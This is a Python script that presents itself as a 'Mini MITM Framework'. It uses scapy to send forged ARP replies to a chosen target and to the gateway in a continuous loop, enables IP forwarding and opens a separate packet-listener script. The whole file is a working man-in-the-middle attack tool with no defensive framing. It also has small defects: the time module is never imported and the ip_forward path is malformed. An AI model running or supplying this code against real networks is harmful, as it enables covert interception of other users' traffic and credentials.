#-*-coding:utf-8-*-
import scapy.all as scapy
import os
import optparse
import subprocess
from subprocess import Popen
try:
	cf = subprocess.check_output("figlet MITM",shell=True)
except subprocess.CalledProcessError:
	os.system("apt-get install figlet")
def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    #scapy.ls(scapy.ARP())
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #scapy.ls(scapy.Ether())
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]

    return answered_list[0][1].hwsrc

def user_input():
	parser = optparse.OptionParser()
	parser.add_option("-g", "--gateway", dest="Gateway",
				  help="enter gateway ip")
	parser.add_option("-t", "--target", dest="Target",
				  help="enter target ip")
	(options, args) = parser.parse_args()
	return options

user = user_input()
gatewayip = user.Gateway
targetip = user.Target
os.system("clear")
os.system("figlet Mini MITM Framework")
print("by Yakup EROĞLU")

print("""
1)can connect to the internet
2)can't connect to the internet
""")
net=input(">>>")

if net=="1":
	os.system("echo 1 > proc/sys/net/ipv4/ip_forward")
else:
	pass

def arp_zehir(gatewayip,targetip):
	targetmac=get_mac_address(targetip)
	arpresponse = scapy.ARP(op=2,psrc=gatewayip,pdst=targetip,hwdst=targetmac)
	scapy.send(arpresponse,verbose=False)
number=0
try:
	#cevap=input("Listen the package[Y/n]")
	#if (cevap == "n" or cevap == "N"):
	#	pass
	#else:
	subprocess.Popen(["xfce4-terminal", "-e", "python /root/Desktop/mMitm/packet_listener.py"], stdout=subprocess.PIPE)
	while True:
		arp_zehir(gatewayip,targetip)
		arp_zehir(targetip,gatewayip)
		time.sleep(1)
		number+=2
		print("\rSending packets " + str(number),end="")
except KeyboardInterrupt:
	print("Quit...")

#scapy.ls(scapy.ARP())





